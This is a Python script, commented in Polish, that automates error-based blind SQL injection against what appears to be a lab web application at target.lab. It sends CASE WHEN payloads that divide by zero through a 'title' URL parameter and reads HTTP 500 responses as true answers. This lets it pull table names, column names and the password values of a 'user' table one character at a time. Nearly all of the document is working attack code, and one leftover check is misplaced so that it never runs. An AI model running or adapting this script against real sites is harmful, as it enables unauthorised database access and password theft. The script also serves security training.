

#? sql injection cheat sheet https://portswigger.net/web-security/sql-injection/cheat-sheet 

#? exploit dotyczy strony testowej http://target.lab
# SELECT * 
#FROM tablename
#WHERE columnname = " ...."
#!/usr/bin/python3
import requests
import string

# ' AND 1=(SELECT CASE WHEN ((SELECT SUBSTRING(version(),1,1))='a') THEN 1/(SELECT 0) ELSE NULL END);-- -
# ' AND 1=(SELECT CASE WHEN ((SELECT SUBSTRING(version(),1,1))='P') THEN 1/(SELECT 0) ELSE NULL END);-- -

# *do tabeli password
#url = "http://target.lab:5000/posts_by_title?title=' AND 1=(SELECT CASE WHEN ((SELECT SUBSTRING(password,!OFFSET!,1) FROM \"user\" OFFSET !MAINOFFSET! LIMIT 1)='!CHAR!') THEN 1/(SELECT 0) ELSE NULL END);-- -"
#lenurl = "http://target.lab:5000/posts_by_title?title=' AND 1=(SELECT CASE WHEN ((SELECT LENGTH(password) FROM \"user\" OFFSET !MAINOFFSET! LIMIT 1)=!LENGTH!) THEN 1/(SELECT 0) ELSE NULL END);-- -"

#do szukania tabel
url = "http://target.lab:5000/posts_by_title?title=' AND 1=(SELECT CASE WHEN ((SELECT SUBSTRING(table_name, !OFFSET!,1) FROM information_schema.tables OFFSET 1 LIMIT 1)='!CHAR!') THEN 1/(SELECT 0) ELSE NULL END);-- -"
lenurl = "http://target.lab:5000/posts_by_title?title=' AND 1=(SELECT CASE WHEN ((SELECT LENGTH(table_name) FROM information_schema.tables OFFSET 1 LIMIT 1)=!LENGTH!) THEN 1/(SELECT 0) ELSE NULL END);-- -"

#do szukania kolumn w tabeli (zmieniamy cyfre ofsetu po kolei na 1, 2, 3 itp)
#url = "http://target.lab:5000/posts_by_title?title=' AND 1=(SELECT CASE WHEN ((SELECT SUBSTRING(column_name, !OFFSET!,1)FROM information_schema.columns WHERE table_name='user' OFFSET 1 LIMIT 1)='!CHAR!') THEN 1/(SELECT 0) ELSE NULL END);-- -"
#lenurl = "http://target.lab:5000/posts_by_title?title=' AND 1=(SELECT CASE WHEN ((SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='user' OFFSET 1 LIMIT 1)=!LENGTH!) THEN 1/(SELECT 0) ELSE NULL END);-- -"



# *Główna pętla to główny offset, który przechodzi przez wszystkie wiersze w danej tabelii do 2 pierwszych url(usuwamy komentzarz razem z tymi url)
#for main_offset in range(0, 100):
    # Pętla sprawdza jak długi jest dany ciąg znaków, który właśnie próbujemy zenumerować
string_length = -1
for length in range(0, 1000):
    new_url = lenurl.replace("!LENGTH!", str(length))
    #*new_url = new_url.replace("!MAINOFFSET!", str(main_offset))
    res = requests.request(url=new_url, method="GET")
    if res.status_code == 500:
        string_length = length
        break

# Jeżeli nie udało nam się uzyskać informacji o długości to znaczy, że prawdopodobnie tam nic nie ma
# możemy kończyć enumerację
        if string_length == -1:
            break
print(f"Length: {string_length}")

# Ta pętla przechodzi po każdym znaku enumerowanego ciągu
for offset in range(1, string_length + 1):
    # A ta pętla przechodzi przez wszystkie drukowalne znaki i sprawdza czy dany znak jest równy temu z bazy danych
    for character in string.printable:
        if character in "'&#":
            continue
        new_url = url.replace("!CHAR!", character)
        new_url = new_url.replace("!OFFSET!", str(offset))
        #*new_url = new_url.replace("!MAINOFFSET!", str(main_offset))
        res = requests.request(url=new_url, method="GET")
        if res.status_code == 500:
            print(character, end="")
            break
print()
